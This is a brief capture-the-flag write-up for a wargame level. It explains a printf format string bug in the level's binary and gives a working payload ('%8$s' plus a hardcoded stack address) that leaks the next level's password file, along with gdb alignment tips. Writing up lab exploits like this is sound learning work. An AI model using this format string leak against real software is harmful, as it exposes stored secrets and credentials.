# LEVEL02

## EXPLANATIONS

### BINARY BEHAVIOR
- only function main :
  - 3 buf (username and password from the input and pass from level03/.pass)
  - printf(buf_username) format string exploit

### EXPLOIT STRATEGY

- put stack address of "buf_pass" in 1-8th bytes of "buff_password" so that printf will %s on this address
  - => prints content of buff_pass
- align stack inside/outside gdb
- bypass opening of .pass file inside gdb by updating string with level02 pass file
  - set {char [26]}string_addr="/home/users/level02/.pass"

### RUN COMMAND
```
python -c "print('%8\$s' + '\n' + '\x00\x00\x7f\xff\xff\xff\xec\xb0'[::-1])" > /tmp/exploit_string
cat /tmp/exploit_string - | env - PWD=$PWD /home/users/level02/level02
```